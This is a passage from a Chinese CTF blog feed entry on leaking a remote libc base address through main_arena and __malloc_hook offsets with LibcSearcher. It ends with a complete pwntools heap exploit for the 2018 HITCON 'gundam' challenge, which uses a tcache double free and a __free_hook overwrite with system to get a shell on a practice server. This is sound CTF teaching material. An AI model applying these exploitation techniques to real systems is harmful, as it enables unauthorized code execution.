class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="远程libc基地址泄露"><a href="#远程libc基地址泄露" class="headerlink" title="远程libc基地址泄露"></a>远程libc基地址泄露</h2><p>前面，我们虽然利用题目的附件里的libc来解决<code>__free_hook</code>、<code>__malloc__hook</code>、<code>system</code>这些敏感symbols的地址的在远程环境和本地环境下偏移的差距但是libc基地址的问题依然没有解决。我们观测远程libc基地址仅仅看<code>main_arena</code>-gdb出偏移得到的地址后三位是否为0，但地址后三位是为0的地址不一定是libc基址。</p><p><img src="image-20210504003927457.png" alt="image-20210504003927457"></p><p>因为在一些附件so文件中，<code>main_arena</code>是没有的,但是有<code>__malloc_hook</code>和<code>__realloc_hook</code>。</p><p><img src="image-20210504100155315.png" alt="image-20210504100155315"></p><p>我们不可能通过<code>real_base_libc=main_arena_add-l.symbols[&#39;main_arena&#39;]</code>来获得基地址。但如果我们gdb过<code>main_arena</code>的地址和看过libc结构就可以发现<code>__malloc_hook</code>和<code>__realloc_hook</code>这两个symbols其实”挨得近”且这距离不受libc版本影响。</p><p><img src="image-20210504094456672.png" alt="image-20210504094456672"></p><p>因此我们可以通过,<code>mian_arena-0x10</code>得到<code>__malloc_hook</code>的真实地址<code>__malloc_hook_addr</code>，<code>mian_arena-0x18</code>得到<code>__realloc_hook</code>的真实地址<code>__realloc_hook_addr</code>。<code>__malloc_hook_addr-l.symbols[&quot;__malloc_hook&quot;]</code>或<code>__realloc_hook_addr-l.symbols[&quot;__realloc_hook&quot;]</code>都可以得到libc的基地址。</p><p><img src="image-20210504101842757.png" alt="image-20210504101842757"></p><p>这样我们就可以不通gdb出libc偏移，就可以得到远程libc的准确基址。</p><h2 id="无so文件推算远程地址"><a href="#无so文件推算远程地址" class="headerlink" title="无so文件推算远程地址"></a>无so文件推算远程地址</h2><p>经过上面步骤改进，我们已经能做到准确得到远程环境地址中任意敏感symbols的地址。但是，我们这过程太依赖题目附近中的so文件。so文件的准确有效性，直接影响到我推算远程地址。那么若题目给了错误的libc或题目只给了libc大版本号没有给出so文件，那还能做题吗?</p><p>回顾整个过程，在整个过程中我们最值得信任的地址就是通过<code>unsorted bin</code>得到<code>main_arena</code>的地址以及通过<code>main_arena</code>所得到的<code>__malloc_hook</code>或<code>__realloc_hook</code>的地址。这是由于这些地址是从单纯利用glibc chunk管理机制中所得到的。</p><p>再回想到，栈溢出时我们获得libc基址时我们只泄露一个函数的最低的 12 位就可以找到相应libc版本。其应用的原理是：</p><blockquote><p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。<br>        即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</p></blockquote><p>既然函数是libc symbols中的一种，那么<code>__malloc_hook</code>或<code>__realloc_hook</code>这些 libc中的变量能一样吗？</p><p>经过查询<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc-database</a>和测试发现<code>__malloc_hook</code>或<code>__realloc_hook</code>这些变量symbols也和函数一样被记录下来。而且:</p><p><strong>在libc中，不仅函数所有libc symbols在 libc.so 动态链接库中,相对之间相对偏移是固定的</strong>。</p><p><strong>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，所有libc symbols最低的 12 位并不会发生改变。</strong></p><p>因此我们可以向在做栈溢出一样，用LibcSearcher来找到远程libc版本，从而推算出各个敏感symbols的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">libc = LibcSearcher(<span class="string">'__malloc_hook'</span>, malloc_hook)<span class="comment">#寻找libc版本</span></span><br><span class="line">libcbase = malloc_hook - libc.dump(<span class="string">'__malloc_hook'</span>)<span class="comment">#计算基地地址</span></span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">system=libcbase+libc.dump(<span class="string">'system'</span>)<span class="comment">#计算system函数地址</span></span><br><span class="line">log.info(<span class="string">'libcbase+system:'</span>+hex(system))</span><br><span class="line"></span><br><span class="line">free_hook=libcbase+libc.dump(<span class="string">'__free_hook'</span>)<span class="comment">#计算__free_hook变量地址</span></span><br><span class="line">log.info(<span class="string">'libcbase+free_hook:'</span>+hex(libcbase+libc.dump(<span class="string">'__free_hook'</span>)))</span><br></pre></td></tr></table></figure><h2 id="2018-HitCon-Pwn-gundam-远程exp"><a href="#2018-HitCon-Pwn-gundam-远程exp" class="headerlink" title="2018-HitCon-Pwn-gundam 远程exp"></a>2018-HitCon-Pwn-gundam 远程exp</h2><p>综上，我们可以利用这些tirck做出一些“阴间环境”的堆题，2018-HitCon-Pwn-gundam就是其中一道（笑）</p><p><img src="buu_gundam.png" alt="image-20210504112333320"></p><p>由于libc不准确，在buu上题目做出人很少。我们可以用我们上面用到的方法找与题目相匹配的libc。从而解决题目。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25457</span>)</span><br><span class="line"><span class="comment">#p=process('./gundam')</span></span><br><span class="line"><span class="comment">#l=ELF('./libc.so.6')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Destory:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">blow_up()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">visit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Gundam[7] :aaaaaaaa'</span>)</span><br><span class="line">addr=p.recv()[<span class="number">1</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">x=int(hex(u64(addr))+<span class="string">'40'</span>,<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'main_arena:'</span>+hex(x))</span><br><span class="line"></span><br><span class="line">malloc_hook=x<span class="number">-0x10</span></span><br><span class="line">log.info(<span class="string">'malloc_hook:'</span>+hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'__malloc_hook'</span>, malloc_hook)</span><br><span class="line">libcbase = malloc_hook - libc.dump(<span class="string">'__malloc_hook'</span>)</span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">system=libcbase+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">log.info(<span class="string">'libcbase+system:'</span>+hex(system))</span><br><span class="line"></span><br><span class="line">free_hook=libcbase+libc.dump(<span class="string">'__free_hook'</span>)</span><br><span class="line">log.info(<span class="string">'libcbase+free_hook:'</span>+hex(libcbase+libc.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">blow_up()</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">build(p64(free_hook))</span><br><span class="line"></span><br><span class="line">build(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">build(p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>找到与远程相匹配的libc，就可以得到flag。</p><p><img src="gundam_2.png" alt="image-20210504112951072"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在做pwn时,一直烦扰我的是本地打通了,远程打不通的情况。这情况在做堆题时印象最为深刻，因为在做堆题我们往往只能从附件或提示中得到题目环境的libc的大版本，导致我们在计算偏移时会与远程存在差异。因此本文从本地泄露地址讲起，如何避免偏移libc版本地址偏移差异导致功亏一篑。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
